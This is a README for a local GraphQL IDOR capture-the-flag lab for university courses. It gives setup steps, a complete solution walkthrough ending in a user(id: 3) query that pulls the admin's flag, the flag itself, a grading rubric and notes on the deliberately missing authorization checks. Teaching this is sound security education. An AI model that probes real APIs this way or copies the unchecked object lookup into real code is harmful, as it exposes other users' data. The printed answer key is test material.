# 🎓 GraphQL IDOR CTF Challenge - University Distribution

## 📋 Super Simple Setup (No Docker Required!)

### **For Students - Just 2 Steps:**

**Step 1: Install Python Dependencies**
```bash
pip install flask graphene flask-graphql
```

**Step 2: Run the Challenge**
```bash
python simple_ctf_challenge.py
```

**That's it!** Challenge runs at `http://localhost:5000`

---

## 🎯 **Challenge Solution Guide**

### **Step 1: Access GraphQL Interface**
- Open browser to `http://localhost:5000`
- Click "Launch GraphiQL Interface"

### **Step 2: Discover Schema (Optional)**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### **Step 3: Check Current User**
```graphql
{
  me {
    id
    username
    email
    role
    flag
  }
}
```

### **Step 4: Exploit IDOR Vulnerability**
```graphql
{
  user(id: 3) {
    id
    username
    email
    role
    flag
  }
}
```

**🏆 FLAG:** `CTF{graphql_idor_pwned_2024}`

---

## 📚 **For Instructors**

### **Distribution:**
1. Share the `simple_ctf_challenge.py` file
2. Share these instructions
3. Students run it locally - no server needed!

### **Grading Rubric:**
- **25%** - Schema discovery
- **25%** - Understanding current user context  
- **25%** - Identifying IDOR vulnerability
- **25%** - Successfully extracting admin flag

### **What Makes This Vulnerable:**
- No authorization checks on `user(id)` query
- Direct object reference without permission validation
- Sensitive data (flags) exposed in API responses

---

## 🔧 **Customization**

### **Change the Flag:**
Edit line 18 in `simple_ctf_challenge.py`:
```python
{"id": 3, "username": "admin", "email": "admin@ctfsecure.com", "role": "admin", "flag": "YOUR_CUSTOM_FLAG"}
```

### **Add University Branding:**
Edit the HTML template around line 40 to add your university name and colors.

---

**Perfect for cybersecurity courses, ethical hacking labs, and GraphQL security education!**